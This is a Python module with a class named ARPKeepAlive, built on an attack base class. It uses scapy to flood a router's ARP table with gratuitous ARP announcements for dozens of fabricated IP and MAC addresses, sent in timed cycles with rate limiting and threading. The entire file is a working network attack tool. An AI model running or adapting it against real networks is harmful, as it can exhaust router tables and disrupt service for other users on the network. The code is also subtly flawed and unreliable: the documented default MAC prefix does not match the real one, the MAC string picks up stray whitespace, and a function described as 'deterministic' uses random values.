import random
import re
import threading
import time

from scapy.all import sendp
from scapy.layers.l2 import ARP, Ether
from scapy.packet import Packet

from .base_attack import BaseAttack


class ARPKeepAlive(BaseAttack):
    """Maintain fake devices in router's ARP table"""

    def __init__(
        self,
        interface: str,
        base_ip: str,
        num_devices: int = 50,
        mac_prefix: str = "de:ad:00",
        interval: float = 5.0,
        cycles: int = 1,
    ):
        """
        Enhanced ARP keep-alive with new parameters:
        :param mac_prefix: First 3 bytes of MAC addresses (default: 02:00:00)
        :param interval: Seconds between announcement cycles (default: 5)
        :param cycles: Number of ARP announcement cycles to perform (default: 1)
        """
        super().__init__(interface)
        self.base_ip = base_ip
        self.num_devices = num_devices
        self.mac_prefix = mac_prefix
        self.interval = interval
        self.cycles = cycles
        self._validate_ip()
        self._validate_mac_prefix()

    def _validate_ip(self) -> None:
        """Validate base IP format"""
        parts = self.base_ip.split(".")
        if len(parts) != 4 or not self.base_ip.endswith("."):
            raise ValueError("Invalid base IP format. Use format like '192.168.1.'")

    def _validate_mac_prefix(self) -> None:
        """Validate first 3 bytes of MAC address"""
        if not re.match(r"^([0-9A-Fa-f]{2}:){2}[0-9A-Fa-f]{2}$", self.mac_prefix):
            raise ValueError("Invalid MAC prefix. Use format like '02:00:00'")

    def _generate_mac(self, ip_suffix: int) -> str:
        """Generate deterministic MAC based on IP suffix"""
        return f"{self.mac_prefix}:\
                {ip_suffix:02x}:\
                {random.randint(0, 0xff):02x}:\
                {random.randint(0, 0xff):02x}"

    def _generate_arp_packet(self, ip_suffix: int) -> Packet:
        """Create ARP announcement packet"""
        ip = f"{self.base_ip}{ip_suffix}"
        mac = self._generate_mac(ip_suffix)
        return Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, hwsrc=mac, psrc=ip, pdst=ip)

    def _send_arp_announcements(self) -> None:
        """
        Send exactly `self.cycles` bursts of gratuitous ARP replies,
        waiting `self.interval` seconds between bursts.
        """
        # Determine inter-packet delay from rate limiter
        pps = max(1, self.num_devices)
        allowed_pps = self._rate_limit(pps)
        delay = 1.0 / allowed_pps

        for cycle in range(1, self.cycles + 1):
            if not self.running:
                break

            for i in range(1, self.num_devices + 1):
                if not self.running:
                    break
                pkt = self._generate_arp_packet(i)
                try:
                    sendp(pkt, iface=self.interface, verbose=False)
                except PermissionError as e:
                    self.logger.warning(f"PermissionError sending ARP: {e}")
                else:
                    self.logger.info(f"Sent gratuitous ARP for {pkt.psrc}")
                time.sleep(delay)

            sleep_status = (
                "no more cycles" if cycle == self.cycles else f"sleeping {self.interval}s"
            )
            self.logger.info(
                f"--- Completed ARP cycle {cycle}/{self.cycles}: "
                f"{self.num_devices} packets sent; "
                f"{sleep_status} ---"
            )

            if cycle < self.cycles and self.running:
                time.sleep(self.interval)

        # After finishing all cycles, perform cleanup then exit process
        self.running = False
        self.logger.info("All ARP cycles complete; exiting.")
        self.stop()

    def start(self) -> None:
        """Start ARP maintenance"""
        if not self.running:
            self.running = True
            self.thread = threading.Thread(target=self._send_arp_announcements)
            self.thread.start()
            self.logger.info(f"Started ARP keep-alive for {self.num_devices} devices")

    def stop(self) -> None:
        """Stop ARP maintenance safely (no self-join)."""
        self.running = False
        if self.thread and self.thread.is_alive() and threading.current_thread() is not self.thread:
            self.thread.join()
        self.logger.info("ARP keep-alive stopped")
